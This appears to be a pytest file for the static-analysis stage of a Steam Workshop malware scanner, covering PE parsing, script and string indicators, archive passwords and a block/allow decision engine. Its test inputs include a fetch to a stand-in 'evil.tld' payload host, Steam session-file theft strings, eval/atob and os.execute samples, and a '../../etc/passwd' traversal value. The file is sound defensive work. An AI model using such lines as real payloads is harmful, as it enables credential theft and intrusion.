"""Tests for Stage 2 -- static analysis.

Covers each detector in isolation (PE header parser, script patterns, string
IOCs, archive-password, system-library impersonation) plus the orchestrator
end-to-end over the real `web_con_descarga` fixture and the decision engine.

None of the synthetic binaries are harmful: the "PE" files are structurally
valid but inert headers, hand-built so the parser's import/entropy/signature
paths are genuinely exercised rather than stubbed.
"""

from __future__ import annotations

import json
import os
import struct
from pathlib import Path

import pytest

from swa import stage2_static
from swa.models import FileEntry, FileType, Finding, Severity, TriageResult, Verdict, WorkshopItem
from swa.stage0_ingest import quarantine
from swa.stage1_triage import triage as triage_mod
from swa.stage2_static import indicators, pe, scripts, strings
from swa.stage4_decision import decide

FIXTURE = Path(__file__).parent / "fixtures" / "web_con_descarga"


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #

def make_pe(
    imports: dict[str, list[str]] | None = None,
    section_bytes: bytes = b"\x00" * 64,
    section_name: bytes = b".text",
    characteristics: int = 0x60000020,  # CODE | EXECUTE | READ
    signed: bool = False,
) -> bytes:
    """Build a minimal but structurally valid PE32 the Stage 2 parser can walk.

    Single section at RVA 0x1000 / file offset 0x400; the import table (if any)
    lives inside that section so RVA->offset resolves.
    """
    imports = imports or {}
    SEC_VA, RAW_OFF = 0x1000, 0x400

    def rva(file_off: int) -> int:
        return SEC_VA + (file_off - RAW_OFF)

    raw = bytearray()
    raw += section_bytes

    import_rva = 0
    if imports:
        byname_off: dict[tuple[str, str], int] = {}
        for dll, funcs in imports.items():
            for fn in funcs:
                byname_off[(dll, fn)] = RAW_OFF + len(raw)
                raw += struct.pack("<H", 0) + fn.encode() + b"\x00"
                if len(raw) % 2:
                    raw += b"\x00"

        dllname_off: dict[str, int] = {}
        for dll in imports:
            dllname_off[dll] = RAW_OFF + len(raw)
            raw += dll.encode() + b"\x00"
            if len(raw) % 2:
                raw += b"\x00"

        ilt_off: dict[str, int] = {}
        for dll, funcs in imports.items():
            ilt_off[dll] = RAW_OFF + len(raw)
            for fn in funcs:
                raw += struct.pack("<I", rva(byname_off[(dll, fn)]))
            raw += struct.pack("<I", 0)

        idt_off = RAW_OFF + len(raw)
        for dll in imports:
            raw += struct.pack(
                "<IIIII", rva(ilt_off[dll]), 0, 0, rva(dllname_off[dll]), rva(ilt_off[dll])
            )
        raw += struct.pack("<IIIII", 0, 0, 0, 0, 0)
        import_rva = rva(idt_off)

    size_opt = 240
    opt = bytearray(size_opt)
    struct.pack_into("<H", opt, 0, 0x10B)  # PE32 magic
    struct.pack_into("<I", opt, 92, 16)  # NumberOfRvaAndSizes
    dir_base = 96
    struct.pack_into("<II", opt, dir_base + 1 * 8, import_rva, 20)  # import dir
    if signed:
        struct.pack_into("<II", opt, dir_base + 4 * 8, 0x9000, 0x100)  # security dir

    PE_OFF = 0x80
    buf = bytearray(RAW_OFF)
    buf[0:2] = b"MZ"
    struct.pack_into("<I", buf, 0x3C, PE_OFF)
    buf[PE_OFF : PE_OFF + 4] = b"PE\x00\x00"
    struct.pack_into("<HHIIIHH", buf, PE_OFF + 4, 0x14C, 1, 0, 0, 0, size_opt, 0x2102)
    buf[PE_OFF + 24 : PE_OFF + 24 + size_opt] = opt

    sec = bytearray(40)
    sec[0 : len(section_name)] = section_name
    struct.pack_into("<I", sec, 8, len(raw))  # VirtualSize
    struct.pack_into("<I", sec, 12, SEC_VA)
    struct.pack_into("<I", sec, 16, len(raw))  # SizeOfRawData
    struct.pack_into("<I", sec, 20, RAW_OFF)  # PointerToRawData
    struct.pack_into("<I", sec, 36, characteristics)
    buf[0x188 : 0x188 + 40] = sec

    return bytes(buf) + bytes(raw)


def fe(path: str, ftype: FileType, ext: str = "") -> FileEntry:
    return FileEntry(path=path, size=0, sha256="0" * 64, filetype=ftype, declared_ext=ext)


def make_item(tmp_path: Path, files: dict[str, bytes | str], entries: list[FileEntry],
              project: dict | None = None) -> WorkshopItem:
    root = tmp_path / "raw"
    root.mkdir(parents=True, exist_ok=True)
    if project is not None:
        (root / "project.json").write_text(json.dumps(project), encoding="utf-8")
    for rel, content in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, str):
            p.write_text(content, encoding="utf-8")
        else:
            p.write_bytes(content)
    return WorkshopItem(
        workshop_id="t", content_hash="h", quarantine_dir=str(tmp_path), files=entries
    )


def codes(findings: list[Finding]) -> set[str]:
    return {f.code for f in findings}


# --------------------------------------------------------------------------- #
# PE header parser
# --------------------------------------------------------------------------- #

def test_pe_unsigned_flagged():
    findings = pe.analyze_pe(make_pe(signed=False), "x.dll")
    assert "pe_unsigned" in codes(findings)


def test_pe_signed_not_flagged_unsigned():
    findings = pe.analyze_pe(make_pe(signed=True), "x.dll")
    assert "pe_unsigned" not in codes(findings)


def test_pe_high_entropy_section():
    data = make_pe(section_bytes=os.urandom(4096))
    findings = pe.analyze_pe(data, "packed.exe")
    assert "pe_high_entropy_section" in codes(findings)


def test_pe_known_packer_section_name():
    findings = pe.analyze_pe(make_pe(section_name=b"UPX0"), "packed.exe")
    assert "pe_known_packer" in codes(findings)


def test_pe_imports_categorised():
    data = make_pe(
        imports={
            "kernel32.dll": ["CreateRemoteThread", "VirtualAllocEx"],
            "wininet.dll": ["InternetOpenA"],
        }
    )
    c = codes(pe.analyze_pe(data, "inject.exe"))
    assert "pe_import_process_injection" in c
    assert "pe_import_network" in c


def test_pe_malformed_never_raises():
    # Truncated PE (from conftest.make_pe_bytes) must degrade, not crash.
    from tests.conftest import make_pe_bytes

    findings = pe.analyze_pe(make_pe_bytes(), "tiny.exe")
    assert isinstance(findings, list)


# --------------------------------------------------------------------------- #
# String / binary IOCs
# --------------------------------------------------------------------------- #

def test_steam_session_theft_is_high():
    findings = strings.scan_binary(b"open C:\\Steam\\config\\loginusers.vdf now", "s.exe", set())
    steal = [f for f in findings if f.code == "ioc_steam_session_theft"]
    assert steal and steal[0].severity is Severity.HIGH


def test_ssfn_file_reference_is_high():
    findings = strings.scan_binary(b"grab ssfn12345678901 token", "s.exe", set())
    assert "ioc_steam_session_theft" in codes(findings)


def test_undeclared_url_flagged_and_allowlist_suppresses():
    text = 'fetch("https://evil.tld/payload")'
    assert "network_undeclared_domain" in codes(indicators.scan_common_iocs(text, "a.js", set()))
    # Declared domain is suppressed.
    assert "network_undeclared_domain" not in codes(
        indicators.scan_common_iocs(text, "a.js", {"evil.tld"})
    )


def test_benign_namespace_host_not_flagged():
    text = '<svg xmlns="http://www.w3.org/2000/svg">'
    assert "network_undeclared_domain" not in codes(indicators.scan_common_iocs(text, "a.svg", set()))


def test_crypto_wallet_flagged():
    text = "send to 0x52908400098527886E0F7030069857D2E4169EE7 wallet"
    assert "ioc_crypto_wallet_address" in codes(indicators.scan_common_iocs(text, "w.exe", set()))


def test_extract_strings_reads_ascii_and_utf16():
    data = b"hello world\x00\x00" + "wideXY".encode("utf-16-le")
    found = strings.extract_strings(data, 5)
    assert any("hello world" in s for s in found)
    assert any("wideXY" in s for s in found)


# --------------------------------------------------------------------------- #
# Script analysis
# --------------------------------------------------------------------------- #

def test_js_eval_flagged():
    c = codes(scripts.analyze_script("eval(atob('x'))", "a.js", FileType.JAVASCRIPT, set()))
    assert "dynamic_code_execution" in c


def test_js_obfuscation_long_blob():
    src = 'var b = "%s";' % ("A" * 250)
    assert "obfuscated_code" in codes(scripts.analyze_script(src, "a.js", FileType.JAVASCRIPT, set()))


def test_lua_sandbox_escape():
    c = codes(scripts.analyze_script('os.execute("calc")', "a.lua", FileType.LUA, set()))
    assert "sandbox_escape_api" in c


def test_js_dynamic_network_when_no_literal_url():
    src = "const u = base + path; fetch(u);"
    c = codes(scripts.analyze_script(src, "a.js", FileType.JAVASCRIPT, set()))
    assert "dynamic_network_destination" in c


# --------------------------------------------------------------------------- #
# Archives
# --------------------------------------------------------------------------- #

def test_archive_password_in_filename(tmp_path):
    entries = [fe("secret_pass1234.zip", FileType.ENCRYPTED_ARCHIVE, ".zip")]
    item = make_item(tmp_path, {"secret_pass1234.zip": b"PK\x03\x04enc"}, entries,
                     project={"type": "scene"})
    findings = stage2_static.analyze(item, ["secret_pass1234.zip"])
    assert "archive_password_in_filename" in codes(findings)
    assert all(f.severity is Severity.HIGH for f in findings if f.code.startswith("archive_"))


def test_archive_password_in_config(tmp_path):
    entries = [
        fe("payload.zip", FileType.ENCRYPTED_ARCHIVE, ".zip"),
        fe("readme.json", FileType.JSON, ".json"),
    ]
    item = make_item(
        tmp_path,
        {"payload.zip": b"PK\x03\x04enc", "readme.json": '{"password": "hunter2"}'},
        entries,
        project={"type": "scene"},
    )
    findings = stage2_static.analyze(item, ["payload.zip"])
    assert "archive_password_in_config" in codes(findings)


# --------------------------------------------------------------------------- #
# Orchestrator
# --------------------------------------------------------------------------- #

def test_empty_file_list_returns_empty():
    item = WorkshopItem(workshop_id="t", content_hash="h", quarantine_dir="/nowhere", files=[])
    assert stage2_static.analyze(item, []) == []


def test_path_traversal_guarded(tmp_path):
    item = make_item(tmp_path, {"ok.js": "1"}, [fe("ok.js", FileType.JAVASCRIPT)],
                     project={"type": "web"})
    findings = stage2_static.analyze(item, ["../../etc/passwd"])
    assert "file_unavailable" in codes(findings)


def test_system_library_impersonation_high(tmp_path):
    entries = [fe("aggregatorhost.dll", FileType.PE, ".dll")]
    item = make_item(tmp_path, {"aggregatorhost.dll": make_pe()}, entries,
                     project={"type": "video"})
    findings = stage2_static.analyze(item, ["aggregatorhost.dll"])
    hits = [f for f in findings if f.code == "ioc_system_library_impersonation"]
    assert hits and hits[0].severity is Severity.HIGH


def test_findings_sorted_high_first(tmp_path):
    entries = [fe("aggregatorhost.dll", FileType.PE, ".dll")]
    item = make_item(tmp_path, {"aggregatorhost.dll": make_pe()}, entries,
                     project={"type": "video"})
    findings = stage2_static.analyze(item, ["aggregatorhost.dll"])
    severities = [f.severity for f in findings]
    assert severities == sorted(severities, key=lambda s: {"high": 0, "medium": 1, "low": 2, "info": 3}[s.value])


# --------------------------------------------------------------------------- #
# End-to-end over the real fixture + decision engine
# --------------------------------------------------------------------------- #

def test_real_fixture_flags_undeclared_download(tmp_path):
    item = quarantine.ingest("web_con_descarga", FIXTURE, metadata={}, quarantine_root=tmp_path)
    tr = triage_mod.triage(item)
    findings = stage2_static.analyze(item, tr.files_to_analyze)
    assert "network_undeclared_domain" in codes(findings)
    assert any("example.com" in f.message for f in findings)


def test_high_static_finding_blocks_via_decision_engine(tmp_path):
    entries = [fe("aggregatorhost.dll", FileType.PE, ".dll")]
    item = make_item(tmp_path, {"aggregatorhost.dll": make_pe()}, entries,
                     project={"type": "video"})
    static_findings = stage2_static.analyze(item, ["aggregatorhost.dll"])
    tr = TriageResult(workshop_id="t", verdict=Verdict.ESCALATE, declared_type="video")
    decision = decide(tr, static_findings=static_findings)
    assert decision.verdict is Verdict.BLOCK
